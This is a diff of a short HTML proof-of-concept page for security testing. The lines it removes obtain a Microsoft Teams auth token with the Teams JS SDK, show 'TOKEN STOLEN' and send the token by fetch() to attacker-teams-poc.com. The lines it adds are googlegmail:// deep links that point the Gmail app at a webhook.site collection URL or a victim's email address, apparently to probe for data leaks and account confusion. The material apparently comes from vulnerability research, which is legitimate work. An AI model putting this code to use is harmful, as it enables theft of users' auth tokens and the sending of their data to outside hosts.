@@ -3,28 +3,11 @@
 <head>
     <title>Teams PoC</title>
     <!-- Include the official Teams JS SDK -->
-    <script src="https://res.cdn.office.net/teams-js/2.20.0/js/MicrosoftTeams.min.js"></script>
 </head>
 <body>
-    <h1>Security PoC</h1>
-    <script>
-        microsoftTeams.app.initialize().then(() => {
-            console.log("Teams SDK Initialized");
-            
-            // This is the "Magic" function that should be restricted
-            // If we get an Auth Token here, we have won.
-            microsoftTeams.authentication.getAuthToken({
-                successCallback: function(token) {
-                    alert("TOKEN STOLEN: " + token.substring(0, 20) + "...");
-                    console.log("Token: " + token);
-                    // Send this to your server
-                    fetch('https://attacker-teams-poc.com/log?token=' + token);
-                },
-                failureCallback: function(err) {
-                    alert("Failure: " + err);
-                }
-            });
-        }).catch(err => alert("Init failed: " + err));
-    </script>
+    <!-- index.html -->
+    <a href="googlegmail://meet/join?url=https://webhook.site/fc53efdf-43dc-49b9-be17-535ddf3cf956/&gaiaID=372364">Join Meet (Test 1)</a>
+    <a href="googlegmail://conference?url=https://webhook.site/fc53efdf-43dc-49b9-be17-535ddf3cf956/&debug=true">Conference Test (Test 2)</a>
+    <a href="googlegmail://meet/join?emailAddress=victim@company.com">Account Confusion Test</a>
 </body>
 </html>
